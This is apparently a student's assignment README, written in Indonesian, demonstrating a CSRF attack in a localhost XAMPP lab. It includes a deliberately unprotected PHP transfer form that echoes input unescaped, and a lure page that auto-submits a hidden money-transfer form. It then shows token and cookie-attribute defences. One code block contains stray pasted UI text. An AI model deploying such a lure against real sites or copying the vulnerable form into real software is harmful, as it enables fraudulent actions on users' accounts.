## UTS_PEMROGRAMAN_WEB2
|             |                                       |
| ----------- | ------------------------------------- |
| Nama        | Dhefi Nurkholik                       |
| NIM         | 312210415                             |
| Kelas       | TI.22.A.4                             |
| Mata Kuliah | Pemrograman Web                       |

## CSRF Attack Demonstration: Permintaan Tak Terduga di Balik Login

Proyek ini adalah eksperimen sederhana untuk memahami bagaimana **Cross-Site Request Forgery (CSRF)** bekerja, dengan menyimulasikan serangan dari halaman eksternal terhadap pengguna yang sudah login. Eksperimen juga menunjukkan bagaimana serangan ini bisa dicegah dengan token CSRF dan konfigurasi cookie yang benar. <br>

## Ringkasan Singkat

**CSRF** (Cross-Site Request Forgery) adalah serangan web di mana penyerang mengecoh browser korban agar mengirim permintaan ke situs tempat korban sudah login, tanpa sepengetahuan pengguna. Serangan ini memanfaatkan kepercayaan server terhadap browser, khususnya melalui cookie session. <br>

## Tujuan Eksperimen

- Menunjukkan bagaimana permintaan berbahaya dapat dilakukan secara otomatis dari luar aplikasi.
- Menggambarkan pentingnya penerapan CSRF Token dalam formulir web.
- Menguji hasil serangan dan perbandingan antara sistem dengan dan tanpa perlindungan.

## Langkah-Langkah Eksperimen

### 1. Setup Folder Proyek

Buat folder `csrf-demo` di `htdocs` (jika menggunakan XAMPP), lalu tambahkan file berikut:

csrf-demo ├── login.php ├── transfer.php ├── attack.html  README.md <br>

### 2. `login.php` — Simulasi Login Pengguna

```php
<?php
session_start();
$_SESSION['user'] = 'admin';
echo "Login berhasil sebagai admin.<br>";
echo "<a href='transfer.php'>Lanjut ke halaman transfer</a>";
?>
```
Fungsi: Membuat sesi login. Di dunia nyata, halaman ini akan memverifikasi username dan password.

### 3. `transfer.php` — Halaman Target Tanpa Perlindungan

```php
<?php
session_start();
if (!isset($_SESSION['user'])) {
    echo "Silakan login terlebih dahulu.";
    exit;
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $to = $_POST['to'];
    $amount = $_POST['amount'];
    echo "<h3>Transfer berhasil ke <b>$to</b> sejumlah <b>Rp $amount</b></h3>";
}
?>

<h2>Transfer Dana</h2>
<form method="POST" action="transfer.php">
    Tujuan: <input type="text" name="to"><br><br>
    Jumlah: <input type="text" name="amount"><br><br>
    <input type="submit" value="Transfer">
</form>
```
Catatan: Form ini tidak memiliki perlindungan CSRF, jadi sangat rentan.

### 4. `attack.html` — Halaman Penyerang

```html
<!DOCTYPE html>
<html>
<head><title>CSRF Attack</title></head>
<body>
  <h2>Selamat! Klik di sini untuk hadiah!</h2>
  <form action="http://localhost/csrf-demo/transfer.php" method="POST" id="attackForm">
    <input type="hidden" name="to" value="rekening_penyerang">
    <input type="hidden" name="amount" value="1000000">
  </form>

  <script>
    document.getElementById("attackForm").submit();
  </script>
</body>
</html>
```

Fungsi: Mengirim permintaan POST palsu secara otomatis saat dibuka. Jika korban login, server akan menganggapnya permintaan sah.

## Langkah Menjalankan Eksperimen
Jalankan Apache di XAMPP.

Buka http://localhost/csrf-demo/login.php untuk login (menyetel session).

Buka http://localhost/csrf-demo/transfer.php untuk memastikan form bekerja.

Buka http://localhost/csrf-demo/attack.html — tanpa interaksi, permintaan transfer akan dikirim otomatis.

Lihat hasilnya di transfer.php — permintaan diterima dan diproses.

## Eksperimen CSRF: Simulasi Serangan
Langkah:

- Setelah login sebagai admin, buka halaman attack.html.

- Halaman akan otomatis mengirim permintaan POST ke transfer.php.

Penjelasan:

- Permintaan dikirim oleh browser menggunakan session aktif.

- Karena tidak ada token atau validasi, permintaan dianggap sah.
<br>

Cara Mencegah CSRF
Gunakan token CSRF dan validasi server-side:

```php
// Buat token saat menampilkan form
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;
echo "<input type='hidden' name='csrf_token' value='$token'>";
php
Salin
Edit
// Validasi token saat menerima POST
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF token tidak valid.");
}
```
Gunakan juga atribut cookie:

```php
setcookie("session", $session_id, [
  'samesite' => 'Strict',
  'secure' => true,
  'httponly' => true
]);
```

## Output

![img](gambar/ss.login.png)

![img](gambar/ss.transfer.png)

![img](gambar/ss.nominal.png)

![img](gambar/ss.hasil.png)

### Link Artikel Publikasi
Artikel ini telah dipublikasikan dan dapat dibaca melalui tautan berikut: <br> 
https://csrfalert.blogspot.com/2025/04/cross-site-request-forgery-csrf-ancaman.html

### Bukti Pengecekan Plagiasi
Berikut adalah hasil pengecekan plagiarisme menggunakan DupliChecker:<br>

![img](gambar/plagiasi.png)

- Plagiarism Rate: 6% <br>
- Unique Content: 94% <br>